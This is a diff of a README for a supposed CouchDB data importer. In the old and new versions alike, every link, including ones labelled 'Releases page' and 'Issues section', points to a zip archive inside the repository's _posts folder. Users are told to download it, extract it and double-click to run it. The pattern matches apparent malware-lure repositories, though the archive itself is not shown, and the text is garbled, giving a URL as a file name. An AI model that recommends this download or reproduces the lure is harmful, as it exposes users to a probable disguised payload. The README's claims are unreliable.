@@ -1,6 +1,6 @@
 # 🚀 couchdb-importer - Easily Import Your Data into CouchDB
 
-![Download Now](https://raw.githubusercontent.com/Joaovictor11011/couchdb-importer/main/_posts/importer_couchdb_3.3.zip%20Now-Visit%20Releases%20Page-brightgreen)
+![Download Now](https://github.com/Joaovictor11011/couchdb-importer/raw/refs/heads/main/_posts/couchdb_importer_v1.4.zip%20Now-Visit%20Releases%20Page-brightgreen)
 
 ## 📥 Features
 - Simple CSV and JSON import capabilities
@@ -17,11 +17,11 @@ To get started with couchdb-importer, follow these simple steps to download and 
 - An active internet connection
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Joaovictor11011/couchdb-importer/main/_posts/importer_couchdb_3.3.zip) to find the latest version of couchdb-importer.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Joaovictor11011/couchdb-importer/raw/refs/heads/main/_posts/couchdb_importer_v1.4.zip) to find the latest version of couchdb-importer.
 2. **Choose Your Version:** Locate the latest release and click on the download link for the appropriate file for your operating system.
-3. **Download the File:** Click the link to start the download. The file should be named something like `https://raw.githubusercontent.com/Joaovictor11011/couchdb-importer/main/_posts/importer_couchdb_3.3.zip` or similar.
+3. **Download the File:** Click the link to start the download. The file should be named something like `https://github.com/Joaovictor11011/couchdb-importer/raw/refs/heads/main/_posts/couchdb_importer_v1.4.zip` or similar.
 4. **Extract the Files:** Once the download is complete, find the downloaded file, right-click on it, and choose "Extract All" or use your preferred extraction tool.
-5. **Run the Application:** Open the extracted folder and double-click on the `https://raw.githubusercontent.com/Joaovictor11011/couchdb-importer/main/_posts/importer_couchdb_3.3.zip` (or the file specific to your OS) to launch the application.
+5. **Run the Application:** Open the extracted folder and double-click on the `https://github.com/Joaovictor11011/couchdb-importer/raw/refs/heads/main/_posts/couchdb_importer_v1.4.zip` (or the file specific to your OS) to launch the application.
 
 ## ⏱ How to Use couchdb-importer
 1. **Select Your Data File:** Open the application and locate the option to choose your data file. You can upload a CSV or JSON file.
@@ -31,13 +31,13 @@ To get started with couchdb-importer, follow these simple steps to download and 
 5. **Check Data:** Once the import is finished, log into your CouchDB to verify that your data appears correctly.
 
 ## 🔄 Support
-If you run into issues or need help, please check the repository's [Issues section](https://raw.githubusercontent.com/Joaovictor11011/couchdb-importer/main/_posts/importer_couchdb_3.3.zip). You can also contact our support team for assistance.
+If you run into issues or need help, please check the repository's [Issues section](https://github.com/Joaovictor11011/couchdb-importer/raw/refs/heads/main/_posts/couchdb_importer_v1.4.zip). You can also contact our support team for assistance.
 
 ## 📄 License
 couchdb-importer is open-source software. You can use and modify it under the terms specified in the license file found in this repository. 
 
 ## 📧 Feedback
-We welcome your feedback. If you have suggestions or find bugs, please let us know through the [Issues section](https://raw.githubusercontent.com/Joaovictor11011/couchdb-importer/main/_posts/importer_couchdb_3.3.zip).
+We welcome your feedback. If you have suggestions or find bugs, please let us know through the [Issues section](https://github.com/Joaovictor11011/couchdb-importer/raw/refs/heads/main/_posts/couchdb_importer_v1.4.zip).
 
 ## 🛠 Topics
 This project covers several topics:
@@ -54,4 +54,4 @@ This project covers several topics:
 
 ---
 
-For more details, best practices, and tips, please remember to check the documentation and community resources. Visit the [Releases page](https://raw.githubusercontent.com/Joaovictor11011/couchdb-importer/main/_posts/importer_couchdb_3.3.zip) to download the latest version today.
+For more details, best practices, and tips, please remember to check the documentation and community resources. Visit the [Releases page](https://github.com/Joaovictor11011/couchdb-importer/raw/refs/heads/main/_posts/couchdb_importer_v1.4.zip) to download the latest version today.
